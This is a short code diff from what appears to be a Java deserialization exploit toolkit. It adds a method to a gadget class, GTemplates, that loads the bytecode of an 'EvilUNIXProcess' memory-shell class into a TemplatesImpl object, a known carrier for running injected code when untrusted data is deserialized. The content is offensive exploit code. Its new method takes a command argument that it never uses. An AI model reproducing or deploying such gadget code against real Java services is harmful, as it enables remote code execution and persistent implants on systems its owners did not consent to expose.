@@ -3,10 +3,14 @@ package xyz.eki.marshalexp.sink.jdk;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import javassist.ClassPool;
 import javassist.CtClass;
+import javassist.CtConstructor;
+import xyz.eki.marshalexp.memshell.EvilUNIXProcess;
 import xyz.eki.marshalexp.utils.MiscUtils;
 
 import java.io.ByteArrayInputStream;
 import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
 
 /**
  * getter -> remote class injection
@@ -58,5 +62,10 @@ public class GTemplates {
         fieldTfactory.set(templatesimpl, Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl").newInstance());
 
         return templatesimpl;
+    }
+
+    public static TemplatesImpl getEvilTemplatesByUNIXProcess(String cmd) throws Exception{
+        byte[] bytecodes = MiscUtils.dumpClass(EvilUNIXProcess.class);
+        return getEvilTemplates(bytecodes);
     }
 }
